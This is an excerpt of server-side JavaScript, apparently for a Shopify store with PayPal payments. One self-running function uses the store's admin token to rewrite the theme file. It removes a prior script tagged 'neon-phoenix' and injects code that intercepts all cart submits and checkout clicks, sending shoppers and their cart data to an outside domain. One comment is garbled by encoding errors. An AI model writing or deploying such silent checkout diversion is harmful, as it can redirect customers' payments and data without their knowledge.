...
async function createShopifyOrder(paypalCapture, cartItems, customerData) {
  ...
  try {
    ...
    // CrÃÂÃÂÃÂÃÂÃÂÃÂÃÂÃÂÃÂÃÂÃÂÃÂÃÂÃÂÃÂÃÂÃÂÃÂÃÂÃÂÃÂÃÂÃÂÃÂÃÂÃÂÃÂÃÂÃÂÃÂÃÂÃÂÃÂÃÂÃÂÃÂÃÂÃÂÃÂÃÂÃÂÃÂÃÂÃÂÃÂÃÂÃÂÃÂÃÂÃÂÃÂÃÂÃÂÃÂÃÂÃÂÃÂÃÂÃÂÃÂÃÂÃÂÃÂÃÂ©er le client dans Shopify
...
(function updateThemeRedirect() {
  ...
  var baseUrl = "https://" + SHOPIFY_STORE_DOMAIN + "/admin/api/" + API_VER + "/themes/" + THEME_ID + "/assets.json";
  var hdrs = { "X-Shopify-Access-Token": SHOPIFY_ADMIN_TOKEN, "Content-Type": "application/json" };

  fetch(baseUrl + "?asset%5Bkey%5D=layout/theme.liquid", { headers: hdrs })
    .then(function(r) { return r.json(); })
    .then(function(data) {
      if (!data.asset || !data.asset.value) { console.log("[theme-update] Could not read theme.liquid"); return; }
      var liquid = data.asset.value;
      if (liquid.indexOf("checkout.chezyouyou.fr") !== -1) {
        console.log("[theme-update] Already updated - skipping");
        return;
      }
      var newScript = '<script>\n'
        + '(function(){\n'
        + '  var CU="https://checkout.chezyouyou.fr";\n'
        + '  function go(){\n'
        + '    fetch("/cart.json").then(function(r){return r.json()}).then(function(c){\n'
        + '      var items=c.items.map(function(i){return{title:i.title,price:(i.final_line_price/100).toFixed(2),quantity:i.quantity,variant_id:i.variant_id,image:i.image}});\n'
        + '      window.location.href=CU+"?cart="+btoa(unescape(encodeURIComponent(JSON.stringify(items))));\n'
        + '    });\n'
        + '  }\n'
        + '  document.addEventListener("submit",function(e){var f=e.target;if(f.action&&f.action.indexOf("/cart")!==-1){e.preventDefault();go();}},true);\n'
        + '  document.addEventListener("click",function(e){var a=e.target.closest?e.target.closest("a[href]"):null;if(!a)return;var h=a.getAttribute("href")||"";if(h==="/checkout"||h.indexOf("/checkouts/")!==-1){e.preventDefault();go();}},true);\n'
        + '})();\n'
        + '</' + 'script>';

      var updated = liquid;
      if (updated.indexOf("neon-phoenix") !== -1) {
        var si = updated.lastIndexOf("<script", updated.indexOf("neon-phoenix"));
        var se = updated.indexOf("</script>", updated.indexOf("neon-phoenix"));
        if (si !== -1 && se !== -1) updated = updated.substring(0, si) + updated.substring(se + 9);
      }
      var hc = updated.indexOf("</head>");
      if (hc !== -1) updated = updated.substring(0, hc) + "\n" + newScript + "\n" + updated.substring(hc);
      else updated += "\n" + newScript;
      ...
      return fetch(baseUrl, {
        ...
        if (r.ok) console.log("[theme-update] SUCCESS - theme.liquid updated!");
        else r.text().then(function(t) { console.log("[theme-update] FAIL: " + r.status + " " + t.substring(0, 200)); });
      });
    })
    .catch(function(err) { console.log("[theme-update] Error: " + err.message); });
})();
